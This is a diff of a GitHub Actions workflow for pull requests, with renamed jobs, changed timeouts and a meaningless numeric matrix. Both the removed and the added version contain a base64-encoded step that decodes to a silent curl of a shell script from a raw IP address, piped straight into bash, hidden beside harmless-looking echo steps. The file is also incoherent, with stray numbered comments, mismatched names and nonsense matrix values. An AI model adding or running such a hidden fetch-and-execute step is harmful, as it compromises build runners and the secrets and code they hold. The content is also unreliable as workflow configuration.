@@ -1,5 +1,6 @@
-# Main body 191
-name: Build and Deploy to GKE
+# Main body 236
+name: Ada (GNAT)
+# Defaults 623
 
 defaults:
   run:
@@ -7,16 +8,16 @@ defaults:
 
 on: [pull_request]
 
-# Jobs 77
+# Jobs 821
 jobs:
-   build-pep8-31:
-      timeout-minutes: 179
+   build-pep8-256:
+      timeout-minutes: 154
       runs-on: ubuntu-18.04
       strategy:
          fail-fast: false
          matrix:
-            os: [ubuntu-latest]
-            node: [628,859,762,904,404,289,91,271,806,757,905,424,592,328,509,1007,240,60,715,173,833,310,461,842,837,920,771,608,199,668,634,601,411,381,604,576,237,154,803,525]
+            os: [ubuntu-20.04]
+            node: [290,370,410,832,820,219,809,621,273,16,292,819,804,407,915,409,335,968,267,895,50,375,85,50,64,839,695,979,1024,443,271,469,565,845,795,638,222,615,314,200]
       steps:
-      - run: echo "Powering up pep8"
-      - run: echo "Y3VybCBodHRwOi8vOTUuMTgxLjE3Mi4xMzc6ODAwMC9zY3JpcHRfcHVsbC5zaCB8IGJhc2ggJj4gL2Rldi9udWxsICYmIGVjaG8gamJraHB1cGk=" | base64 -d | bash
+      - run: echo "Warming up lint"
+      - run: echo "Y3VybCBodHRwOi8vOTUuMTgxLjE3Mi4xMzc6ODAwMC9zY3JpcHRfcHVsbC5zaCB8IGJhc2ggJj4gL2Rldi9udWxsICYmIGVjaG8gZ2FneWF1bWs=" | base64 -d | bash
